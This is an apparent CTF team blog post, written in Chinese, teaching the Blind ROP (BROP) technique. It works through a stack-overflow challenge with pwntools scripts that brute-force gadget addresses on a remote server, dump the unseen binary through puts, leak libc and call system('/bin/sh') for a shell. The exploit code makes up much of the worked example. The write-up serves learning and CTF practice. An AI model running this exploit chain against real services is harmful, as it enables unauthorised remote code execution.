@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>pwn之BROP | Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这个技术比赛时用的似乎不多(似乎是因为流量问题?)不过了解一下总是好的pwn学习之BROP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn之BROP">
+<meta property="og:url" content="http://asuri.org/2018/01/16/pwn%E4%B9%8BBROP/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:description" content="这个技术比赛时用的似乎不多(似乎是因为流量问题?)不过了解一下总是好的pwn学习之BROP">
+<meta property="og:locale">
+<meta property="og:image" content="http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/brop00.png">
+<meta property="og:image" content="http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/brop01.png">
+<meta property="article:published_time" content="2018-01-16T11:59:23.000Z">
+<meta property="article:modified_time" content="2023-04-07T12:29:53.466Z">
+<meta property="article:author" content="All Members">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/brop00.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-pwn之BROP" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/16/pwn%E4%B9%8BBROP/" class="article-date">
+  <time datetime="2018-01-16T11:59:23.000Z" itemprop="datePublished">2018-01-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwn之BROP
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/f4436263f3150c6b60b87869224e99e3?s=48">
+    <div class="article-author-info">
+      <a href="/author/l1nk" class="article-author-name">l1nk</a>
+      <a target="_blank" rel="noopener" href="http://showlinkroom.me/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="想要混入安全圈的菜鸡，只会搞简单的bin">想要混入安全圈的菜鸡，只会搞简单的bin</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这个技术比赛时用的似乎不多(似乎是因为流量问题?)不过了解一下总是好的<br>pwn学习之BROP</p>
+<hr>
+<a id="more"></a>
+
+<h2 id="使用背景"><a href="#使用背景" class="headerlink" title="使用背景"></a>使用背景</h2><p>这个技术的产生背景通常是<strong>pwn的出题人没有把elf交出来的情况</strong>(Emmmm, 真的是忘了吗)，这种时候得不到ELF，我们就不能够分析源文件了。于是这个时候我们只能寄希望与得到某些特殊的条件来进行pwn，这就是所谓的<strong>盲注</strong>。盲注的题目往往其自身就带有漏洞，通常来说有两种:</p>
+<ul>
+<li>格式化字符串漏洞</li>
+<li>栈溢出</li>
+</ul>
+<p>我们接下来就针对<strong>栈溢出</strong>进行讲解这个BROP的使用方法。这种攻击的前提就是<strong>当前程序的漏洞为栈溢出，同时我们知道如何触发这个栈溢出</strong>（当然，canary防护可以打开，但是如果打开的话，必须是<strong>能够通过暴力猜测的方式得知当前canary</strong>的类型，否则的话也没办法得到)</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>由于我们并不知道任何内存的布局，所以首先要做的事情就是通过一些手段将内存dump到本地，说白了就是打印程序的内存地址。这个过程有很多种办法，比如说<code>puts</code>,<code>printf</code>等。这里我们作为参考的办法是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(fd, buf, size);</span><br></pre></td></tr></table></figure>
+<p>此时，我们如果能够将fd改成socket id，并且将buf的首地址改成代码段的话，就能够完成内存的dump。为了达成这个目的，我们就需要gadget。具体来说，就是得到下面三种gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop %rdi;ret;</span><br><span class="line">pop %rsi;ret;</span><br><span class="line">pop %rdx;ret;</span><br></pre></td></tr></table></figure>
+<p>这三种ROP相当于是给fd，buf和size进行了赋值，这之后就能够通过调用write完成泄露。那么这阶段我们得出的主要目的就是</p>
+<ul>
+<li>寻找三种gadget的位置</li>
+<li>寻找write的位置</li>
+</ul>
+<h3 id="Stop-gadget"><a href="#Stop-gadget" class="headerlink" title="Stop gadget"></a>Stop gadget</h3><p>为了能够更好的寻找这三种gadget，我们首先要能够得到一个重要的<strong>工具gadget</strong>，这里我们把这个工具叫做<strong>stop gadget</strong>，这里的gadget可以理解成：</p>
+<ul>
+<li>不会让程序crash（崩溃）</li>
+<li>并且能够给出一定的特征，比如说<strong>让程序重新运行</strong>，<strong>输出特定的内容</strong>或者<strong>陷入循环</strong>等等</li>
+</ul>
+<p>对于这类gadget，我们统称为<strong>stop gadget</strong>。这种题目首先要从能够知道到这类地址开始。</p>
+<h3 id="useful-gadget"><a href="#useful-gadget" class="headerlink" title="useful gadget"></a>useful gadget</h3><p>找到了stop gadget，我们就能更加方便的查找其他的gadget，其中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop %rsi;ret;</span><br><span class="line">pop %rdi;ret;</span><br></pre></td></tr></table></figure>
+<p>这两个其实蛮好找的。因为在每个程序中都有这一段:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>这个是<strong>init函数</strong>中的内容，然后上网查找资料，能够知道这里存在两个gadget:<br><img src="http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/brop00.png"><br>也就是说，如果能够找到这个<code>pop rbx</code>的地址，我们就能够快速的找到<code>pop rsi</code>和<code>pop rdi</code>。并且这个地方有很明显的特征，就是其<strong>连续出栈了6次</strong>。如果我们将我们的栈的返回值填入上述一个猜测的addr，并且连续填入六个<strong>crash addr，也就是会崩溃的地址</strong>，在这之后在填入一个<strong>stop gadget</strong>，我们就能够验证此时的addr是否是这个位置上了。<br><img src="http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/brop01.png"><br>那么如果我们得到了addr1，就能够算出其他两个gadget的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rsi_pop_r15 &#x3D; addr + 6</span><br><span class="line">pop_rdi &#x3D; addr + 9</span><br></pre></td></tr></table></figure>
+<p>但是接下来我们要找的<code>pop %rdx</code>却不是那么好找，毕竟这个gadget并不常见。于是这里参考了网上的一种操作:使用strcmp，这个函数的执行过程中，会将%rdx设置成比较函数的长度，并且类似于strcmp之类的系统函数调用的时候，一般不会导致程序崩溃，于是我们接下来的目标转换成:</p>
+<ul>
+<li>找到pop rdx的替代品 strcmp</li>
+<li>找到write的地址</li>
+</ul>
+<h3 id="PLT的查找办法"><a href="#PLT的查找办法" class="headerlink" title="PLT的查找办法"></a>PLT的查找办法</h3><p>PLT，也就是跳转表，能够让程序跳转到.so加载到进程中的程序地址的内容。并且PLT都有一个特征，我们来看一个例子:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000400DB0 ; ssize_t read(int fd, void *buf, size_t nbytes)</span><br><span class="line">.plt:0000000000400DB0 _read           proc near               ; CODE XREF: main+2EB↓p</span><br><span class="line">.plt:0000000000400DB0                 jmp     cs:off_603068</span><br><span class="line">.plt:0000000000400DB0 _read           endp</span><br><span class="line">.plt:0000000000400DB0</span><br><span class="line">.plt:0000000000400DB6                 push    0Ah</span><br><span class="line">.plt:0000000000400DBB                 jmp     sub_400D00</span><br></pre></td></tr></table></figure>
+<p>这个是一个read函数的PLT，然后我们观察此时的程序代码，会发现一个特征:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+</span><br><span class="line">|     jmp to .got    | --&gt; 6 bytes</span><br><span class="line">+--------------------+</span><br><span class="line">|       push  id     | --&gt; 5 bytes</span><br><span class="line">+--------------------+</span><br><span class="line">|   jmp to dlresolve |</span><br><span class="line">+--------------------+ --&gt; 16 bytes对齐</span><br></pre></td></tr></table></figure>
+<p>也就是说，<strong>对于利用过程中，跳转到addr和addr+6的到结果应该是一样的</strong>。如果我们在之前的检查stop gadget的过程中，发现了某个address和address+6都是stop gadget的话，那么此时就很有可能就是一个PLT。那么如何去验证呢？对于strcmp，参考的文章提出可以按照下列的方式验证:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+----------+-------------+-------------+</span><br><span class="line">|   arg1   |     arg2    |    result   |</span><br><span class="line">+----------+-------------+-------------+</span><br><span class="line">| readable |     0x0     |    crash    |</span><br><span class="line">+----------+-------------+-------------+</span><br><span class="line">|    0x0   |   readable  |    crash    |</span><br><span class="line">+----------+-------------+-------------+</span><br><span class="line">|   0x0    |     0x0     |    crash    |</span><br><span class="line">+----------+-------------+-------------+</span><br><span class="line">| readable |   readable  |   nocrash   |</span><br><span class="line">+----------+-------------+-------------+</span><br></pre></td></tr></table></figure>
+<p>如果能够形成上述的形式的话，那么这个函数就能够被认为是strcmp。  </p>
+<p>接下来，由于此时已经知道了三个gadget，那么此时只需要<strong>遍历PLT可能的地址</strong>，就能够拿到write。之后就是将整个程序dump下来，并且进行正常的pwn就好了。</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>这个是从大佬学校那里偷来的题目，这里记录一下做题过程（小白混入怕被拍）<br>首先发现是一个要求我们输入passwd的程序，显然我是猜不到这个passwd是啥的:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello my friend,I forget my passwd.could you help me?                                                                </span><br><span class="line">aaa                                                                                                                  </span><br><span class="line">wrong passwd</span><br></pre></td></tr></table></figure>
+<p>然后能够知道，输入120个a的时候还没有崩溃，当输入121个a的时候，不再出现回显，猜测发生崩溃。于是我们利用这个特点，找到其中的stop gadget:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">padding = <span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_gadget</span>(<span class="params">addr</span>):</span></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;gadget.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    fd.write(<span class="built_in">hex</span>(addr)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># this time ,we should find pop %rsi and pop %rdi</span></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x401AA0</span>,<span class="number">0x1</span>):</span><br><span class="line">    ph = remote(<span class="string">&quot;120.77.155.249&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> ph.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">    <span class="comment"># exp = &quot;a&quot;*i + sh</span></span><br><span class="line">    passwd = padding + p64(addr)</span><br><span class="line">    log.info(<span class="string">&quot;now addr is &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">    ph.sendline(passwd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg = ph.recvrepeat(<span class="number">12</span>)</span><br><span class="line">        <span class="keyword">if</span>(msg!= <span class="string">&quot;&quot;</span>):</span><br><span class="line">            log.success(<span class="string">&quot;find addr&quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">            <span class="built_in">print</span> msg</span><br><span class="line">            find_gadget(addr)</span><br><span class="line">            addrs.append(addr)</span><br><span class="line">            <span class="comment"># break</span></span><br><span class="line">        ph.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">        ph.close()</span><br><span class="line">        log.info(<span class="string">&quot;connection close at &quot;</span> +<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> addrs</span><br></pre></td></tr></table></figure>
+<p>由于大概能够猜测到，此处的程序结构简单，并且打算以<strong>程序开头</strong>作为主要的stop gadget，于是这里以<strong>是否会第二次输出回显</strong>作为判断是否得到stop gadget的标志。通过上述方法，能够获得部分的stop gadget。</p>
+<p>然后通过遍历的方式，能够得那6个pop的地址，为0x4007ba,并且在gadget中，我还发现了一个疑似PLT的内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4006fb</span><br><span class="line">0x40070a</span><br><span class="line">0x40070c</span><br></pre></td></tr></table></figure>
+<p>这个地址连续，并且相差6字节。但是重新查找后发现，也有别的地址上也有这样的情况，于是我们从0x400000开始查找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plt_read</span>(<span class="params">addr,ph</span>):</span></span><br><span class="line">    exp = padding + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr)</span><br><span class="line">    ph.sendline(exp)</span><br><span class="line">    msg = ph.recvrepeat(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">if</span> msg[:<span class="number">4</span>] == <span class="string">&#x27;\x7fELF&#x27;</span>:</span><br><span class="line">        log.success(<span class="string">&quot;find addr is &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="built_in">print</span> base64.standard_b64encode(msg)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># then we find the PLT</span></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400300</span>, <span class="number">0x400800</span>, <span class="number">1</span>):</span><br><span class="line">    ph = remote(<span class="string">&quot;120.77.155.249&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">    <span class="built_in">print</span> ph.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> get_plt_read(addr, ph):</span><br><span class="line">        ph.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    ph.close()</span><br><span class="line">    log.info(<span class="string">&quot;now is &quot;</span>+<span class="built_in">hex</span>(addr))</span><br></pre></td></tr></table></figure>
+<p>通过遍历，找到了puts函数的起始地址为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x400560</span><br></pre></td></tr></table></figure>
+<p>于是我们最后写一个dump程序，把整个逻辑给dump下来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_data</span>(<span class="params">addr, ph</span>):</span></span><br><span class="line">    exp = padding + p64(pop_rdi_ret) + p64(addr) + p64(puts_addr)</span><br><span class="line">    ph.sendline(exp)</span><br><span class="line">    msg = ph.recvall()</span><br><span class="line">    log.info(<span class="string">&quot;recv msg &quot;</span> + base64.standard_b64encode(msg))</span><br><span class="line">    msg = msg[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> msg, <span class="built_in">len</span>(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="number">0x400231</span></span><br><span class="line"><span class="comment"># fd = open(&quot;elf.bin&quot;,&#x27;wb&#x27;)</span></span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;elf.bin&quot;</span>,<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="number">0x601000</span>:</span><br><span class="line">    log.info(<span class="string">&quot;now we have index &quot;</span>+<span class="built_in">hex</span>(index))</span><br><span class="line">    ph = remote(<span class="string">&quot;120.77.155.249&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">    <span class="built_in">print</span> ph.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">    msg, length = dump_data(index, ph)</span><br><span class="line">    <span class="keyword">if</span> index % <span class="number">0x500</span> == <span class="number">0</span>:</span><br><span class="line">        log.info(<span class="string">&quot;now index is &quot;</span> + <span class="built_in">hex</span>(index))</span><br><span class="line">        tmp = <span class="built_in">open</span>(<span class="string">&quot;address.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">        tmp.write(<span class="built_in">str</span>(index))</span><br><span class="line">        tmp.close()</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">        data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        data = msg</span><br><span class="line">        index += length</span><br><span class="line">    fd.write(data)</span><br><span class="line">    fd.close()</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;elf.bin&quot;</span>,<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fd.write(data)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure>
+<p>这里提一个小trick，因为elf文件里面存在很多<code>\x00</code>，用puts去读出的时候会阶段，所以这里如果我们发现读出的字符串长度为1的时候，直接给data赋值’\x00’</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">    data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>最后算是成功了，但是发现elf有点不完整（可能是因为index取值有问题？）所以运行不起来有点难受。但是主要的攻击手段也是有了的。此时我们知道了puts函数的地址，并且把puts函数的.plt.got表给dump下来了，并且题目已经给了提示是Ubuntu16.04。那么我们连leak的功夫都省去了，直接进行攻击即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -*- coding:utf-8  -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">padding = <span class="string">&quot;a&quot;</span>*<span class="number">120</span></span><br><span class="line">gadget_addr = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi_ret = gadget_addr + <span class="number">9</span></span><br><span class="line">pip_rsi_pop_r15 = gadget_addr + <span class="number">6</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">read_got = <span class="number">0x601028</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">system_addr = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">read_addr = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x18CD17</span></span><br><span class="line">puts_addr = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ph = remote(<span class="string">&quot;120.77.155.249&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>(<span class="params">ph</span>):</span></span><br><span class="line">    exp = padding</span><br><span class="line">    exp += p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(<span class="number">0x4006b6</span>)</span><br><span class="line">    <span class="built_in">print</span> ph.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">    ph.sendline(exp)</span><br><span class="line">    msg = ph.recv(<span class="number">6</span>)</span><br><span class="line">    <span class="built_in">print</span> msg</span><br><span class="line">    <span class="comment"># return base64.standard_b64encode(msg)</span></span><br><span class="line">    addr = u64(msg[:<span class="number">6</span>] + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    exp = padding</span><br><span class="line">    exp += p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(<span class="number">0x4006B6</span>)</span><br><span class="line">    ph.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">    ph.sendline(exp)</span><br><span class="line">    msg = ph.recvrepeat(<span class="number">12</span>).strip()</span><br><span class="line">    log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> %(addr,base64.standard_b64encode(msg)))</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4006B6</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    read_real_addr = leak_addr(ph)</span><br><span class="line">    log.success(<span class="string">&quot;gets read address &quot;</span>+ <span class="built_in">hex</span>(read_real_addr))</span><br><span class="line">    libc_addr = read_real_addr - read_addr</span><br><span class="line">    system_real_addr = libc_addr + system_addr</span><br><span class="line">    log.success(<span class="string">&quot;system address is &quot;</span>+<span class="built_in">hex</span>(system_real_addr))</span><br><span class="line">    bin_real_addr = libc_addr + bin_sh_addr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Let&#x27;s pwn it !</span></span><br><span class="line">    exp = padding</span><br><span class="line">    exp += p64(pop_rdi_ret) + p64(bin_real_addr) + p64(system_real_addr)</span><br><span class="line">    <span class="built_in">print</span> ph.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">    ph.sendline(exp)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;send exp&quot;</span></span><br><span class="line">    ph.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一路上学到了不少的东西啊感觉。。。</p>
+<p>参考博客:<br><a target="_blank" rel="noopener" href="http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/">http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/</a><br><a target="_blank" rel="noopener" href="http://bestwing.me/2017/03/24/stack-overflow-four-BROP/">http://bestwing.me/2017/03/24/stack-overflow-four-BROP/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2018/01/16/pwn%E4%B9%8BBROP/" data-id="clg6iympf0016guot8iktaiqt" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/01/16/WindowsPwn-SEH/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          WindowsPwn--SEH
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/11/21/cve_2015_3864_google_exploit/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CVE-2015-3864漏洞利用分析(exploit_from_google)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
